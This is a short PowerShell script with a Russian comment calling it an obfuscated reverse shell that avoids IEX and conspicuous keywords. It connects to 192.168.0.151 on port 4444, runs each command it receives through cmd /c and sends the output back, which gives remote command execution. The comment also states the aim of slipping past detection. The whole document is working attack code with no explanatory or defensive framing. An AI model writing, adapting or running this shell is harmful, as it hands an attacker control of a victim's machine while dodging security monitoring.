# Обфусцированный reverse shell без IEX и ярких ключей
$h='192.168.0.151'; $p=4444;
$t=New-Object Net.Sockets.TcpClient;
$t.Connect($h,$p);
$s=$t.GetStream();
$b=New-Object byte[] 1024;
$e=New-Object System.Text.ASCIIEncoding;
while(($i=$s.Read($b,0,$b.Length)) -ne 0){
  $d=$e.GetString($b,0,$i);
  $o=(cmd /c $d 2>&1 | Out-String);
  $r=$e.GetBytes($o);
  $s.Write($r,0,$r.Length)
}
$t.Close()
